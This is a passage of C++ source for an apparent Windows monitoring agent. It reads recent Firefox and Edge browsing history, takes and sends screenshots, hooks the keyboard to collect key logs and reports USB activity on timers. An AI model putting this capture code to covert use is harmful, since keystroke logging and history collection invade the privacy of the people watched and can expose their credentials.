    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
#endif
    
    // Find all profiles, prefer default profile
    std::string profilePath;
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found default profile
        profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
        FindClose(hFind);
    } else {
        // Try to find any profile
        hFind = FindFirstFileA((firefoxPath + "\\*").c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string testPath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
                    if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        profilePath = testPath;
                        break;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    if (profilePath.empty()) {
        return "";
    }
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_firefox_history.db";
    if (!CopyFileA(profilePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = profilePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
        writeDebugLog("Firefox query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
        writeDebugLog("Firefox query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != profilePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Edge history
std::string getEdgeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_edge_history.db";
    if (!CopyFileA(edgePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = edgePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Edge query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Edge query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != edgePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Main monitoring task
void monitorTask() {
    auto lastScreenshot = std::chrono::steady_clock::now();
    auto lastTic = std::chrono::steady_clock::now();
    auto lastHistory = std::chrono::steady_clock::now();
    auto lastKeyLog = std::chrono::steady_clock::now();
    auto lastUSBLog = std::chrono::steady_clock::now();
    
    // Create screenshots directory if it doesn't exist
    std::string screenshotsDir = "screenshots";
    if (!CreateDirectoryA(screenshotsDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        std::cerr << "Warning: Could not create screenshots directory" << std::endl;
    }
    
    while (activeRunning) {
        auto now = std::chrono::steady_clock::now();
        
        // Screenshot
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
            std::string timestamp = getCurrentDateTimeString();
            std::replace(timestamp.begin(), timestamp.end(), ':', '-');
            std::replace(timestamp.begin(), timestamp.end(), ' ', '_');
            
            std::string screenshotPath = screenshotsDir + "\\screenshot_" + timestamp + ".jpg";
            takeScreenshot(screenshotPath);
            sendScreenshot(screenshotPath);
            
            lastScreenshot = now;
        }
        
        // Tic event
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= TIC_INTERVAL) {
            sendTicEvent();
            lastTic = now;
        }
        
        // Browser history
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= HISTORY_INTERVAL) {
            collectBrowserHistory();
            sendBrowserHistories();
            lastHistory = now;
        }
        
        // Key logs
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= KEY_INTERVAL) {
            sendKeyLogs();
            lastKeyLog = now;
        }
        
        // USB logs
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= 30) {
            sendUSBLogs();
            lastUSBLog = now;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Main function
int main() {
    // Set DPI awareness to handle scaling properly (MinGW compatible)
    SetProcessDPIAware();
    
    // Initialize COM for GDI+
    CoInitialize(NULL);
    
    // Get MAC address
    macAddress = getMacAddress();
    if (macAddress.empty()) {
        std::cerr << "Warning: Could not get MAC address" << std::endl;
    }
    
    // Setup keyboard monitoring
    setupKeyboardHook();
    
    // Setup USB monitoring
    setupUSBMONITORING();
    writeDebugLog("USB monitoring setup completed");
    
    // Start monitoring thread
    std::thread monitorThread(monitorTask);
    writeDebugLog("Monitoring thread started");
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    activeRunning = false;
    monitorThread.join();
    removeKeyboardHook();
    cleanupUSBMONITORING();
    CoUninitialize();
    
    return 0;
}

// Write debug log to file
void writeDebugLog(const std::string& message) {
    std::ofstream logFile("monitor_debug.log", std::ios::app);
    if (logFile.is_open()) {
        std::string timestamp = getCurrentDateTimeString();
        logFile << "[" << timestamp << "] " << message << std::endl;
        logFile.close();
    }
} 